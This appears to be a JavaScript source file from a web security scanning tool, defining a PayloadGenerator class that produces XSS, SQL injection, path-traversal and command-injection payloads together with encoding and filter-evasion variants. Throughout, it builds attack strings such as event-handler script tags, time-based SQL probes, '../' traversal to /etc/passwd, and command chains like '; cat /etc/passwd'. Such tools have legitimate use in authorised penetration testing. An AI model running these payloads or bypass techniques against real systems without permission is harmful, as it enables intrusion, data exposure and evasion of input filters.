
import { VulnerabilityDatabase } from '../data/VulnerabilityDatabase.js';

export class PayloadGenerator {
  constructor() {
    this.vulnDb = new VulnerabilityDatabase();
    this.encodings = ['url', 'html', 'base64', 'unicode', 'double_url'];
    this.bypasses = ['case_variation', 'comment_insertion', 'whitespace_manipulation'];
  }

  generatePayloads(type, options = {}) {
    const basePayloads = this.vulnDb.getPayloads(type);
    let payloads = [...basePayloads];

    if (options.applyEncoding) {
      payloads = payloads.concat(this.applyEncodings(basePayloads));
    }

    if (options.applyBypasses) {
      payloads = payloads.concat(this.applyBypasses(basePayloads));
    }

    if (options.generateMutations) {
      payloads = payloads.concat(this.generateMutations(basePayloads, type));
    }

    return [...new Set(payloads)]; // Remove duplicates
  }

  applyEncodings(payloads) {
    const encodedPayloads = [];
    
    for (const payload of payloads) {
      // URL encoding
      encodedPayloads.push(encodeURIComponent(payload));
      
      // Double URL encoding
      encodedPayloads.push(encodeURIComponent(encodeURIComponent(payload)));
      
      // HTML entity encoding
      encodedPayloads.push(this.htmlEncode(payload));
      
      // Base64 encoding
      encodedPayloads.push(Buffer.from(payload).toString('base64'));
      
      // Unicode encoding
      encodedPayloads.push(this.unicodeEncode(payload));
      
      // Hex encoding
      encodedPayloads.push(this.hexEncode(payload));
    }
    
    return encodedPayloads;
  }

  applyBypasses(payloads) {
    const bypassedPayloads = [];
    
    for (const payload of payloads) {
      // Case variation
      bypassedPayloads.push(payload.toUpperCase());
      bypassedPayloads.push(payload.toLowerCase());
      bypassedPayloads.push(this.randomCase(payload));
      
      // Comment insertion (for SQL, XSS)
      if (payload.includes('script') || payload.includes('SELECT')) {
        bypassedPayloads.push(payload.replace(/(\w)/g, '$1/**/'));
        bypassedPayloads.push(payload.replace(/ /g, '/**/'));
      }
      
      // Whitespace manipulation
      bypassedPayloads.push(payload.replace(/ /g, '\t'));
      bypassedPayloads.push(payload.replace(/ /g, '\n'));
      bypassedPayloads.push(payload.replace(/ /g, '\r'));
      bypassedPayloads.push(payload.replace(/ /g, '\f'));
      
      // Null byte insertion
      bypassedPayloads.push(payload + '%00');
      bypassedPayloads.push(payload + '\x00');
      
      // Character concatenation
      if (payload.includes('"') || payload.includes("'")) {
        bypassedPayloads.push(payload.replace(/"/g, '"+'));
        bypassedPayloads.push(payload.replace(/'/g, "'+"));
      }
    }
    
    return bypassedPayloads;
  }

  generateMutations(payloads, type) {
    const mutations = [];
    
    switch (type) {
      case 'xss':
        mutations.push(...this.generateXSSMutations(payloads));
        break;
      case 'sqlinjection':
        mutations.push(...this.generateSQLMutations(payloads));
        break;
      case 'lfi':
        mutations.push(...this.generateLFIMutations(payloads));
        break;
      case 'cmdi':
        mutations.push(...this.generateCMDIMutations(payloads));
        break;
    }
    
    return mutations;
  }

  generateXSSMutations(payloads) {
    const mutations = [];
    const events = ['onload', 'onerror', 'onfocus', 'onmouseover', 'onclick', 'onsubmit'];
    const tags = ['img', 'svg', 'iframe', 'script', 'input', 'body', 'div'];
    
    for (const event of events) {
      for (const tag of tags) {
        mutations.push(`<${tag} ${event}=alert("XSS")>`);
        mutations.push(`<${tag} ${event}=confirm("XSS")>`);
        mutations.push(`<${tag} ${event}=prompt("XSS")>`);
      }
    }
    
    return mutations;
  }

  generateSQLMutations(payloads) {
    const mutations = [];
    const operators = ['AND', 'OR', 'UNION', 'SELECT'];
    const functions = ['version()', 'user()', 'database()', 'sleep(5)'];
    
    for (const operator of operators) {
      for (const func of functions) {
        mutations.push(`' ${operator} ${func}--`);
        mutations.push(`' ${operator} ${func}#`);
        mutations.push(`' ${operator} ${func}/*`);
      }
    }
    
    return mutations;
  }

  generateLFIMutations(payloads) {
    const mutations = [];
    const depths = [3, 5, 7, 10];
    const files = ['/etc/passwd', '/etc/hosts', '/proc/version', '/var/log/apache2/access.log'];
    
    for (const depth of depths) {
      const traversal = '../'.repeat(depth);
      for (const file of files) {
        mutations.push(traversal + file);
        mutations.push(traversal + file + '%00');
        mutations.push(traversal + file + '?');
        mutations.push(traversal + file + '#');
      }
    }
    
    return mutations;
  }

  generateCMDIMutations(payloads) {
    const mutations = [];
    const separators = [';', '|', '&', '&&', '||'];
    const commands = ['id', 'whoami', 'pwd', 'ls', 'cat /etc/passwd', 'sleep 5'];
    
    for (const sep of separators) {
      for (const cmd of commands) {
        mutations.push(`${sep} ${cmd}`);
        mutations.push(`${sep}${cmd}`);
        mutations.push(`$(${cmd})`);
        mutations.push(`\`${cmd}\``);
      }
    }
    
    return mutations;
  }

  htmlEncode(str) {
    return str.replace(/[&<>"']/g, (char) => {
      const entities = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;'
      };
      return entities[char];
    });
  }

  unicodeEncode(str) {
    return str.split('').map(char => {
      const code = char.charCodeAt(0);
      return code > 127 ? `\\u${code.toString(16).padStart(4, '0')}` : char;
    }).join('');
  }

  hexEncode(str) {
    return str.split('').map(char => 
      '%' + char.charCodeAt(0).toString(16).padStart(2, '0')
    ).join('');
  }

  randomCase(str) {
    return str.split('').map(char => 
      Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
    ).join('');
  }

  generateContextualPayloads(context, type) {
    const payloads = this.generatePayloads(type, { 
      applyEncoding: true, 
      applyBypasses: true, 
      generateMutations: true 
    });
    
    return payloads.map(payload => this.adaptToContext(payload, context));
  }

  adaptToContext(payload, context) {
    switch (context) {
      case 'html_attribute':
        return `" ${payload} "`;
      case 'html_content':
        return payload;
      case 'javascript':
        return `'; ${payload}; //`;
      case 'css':
        return `/* ${payload} */`;
      case 'url_parameter':
        return encodeURIComponent(payload);
      case 'json':
        return `"${payload.replace(/"/g, '\\"')}"`;
      case 'xml':
        return `<![CDATA[${payload}]]>`;
      default:
        return payload;
    }
  }
}
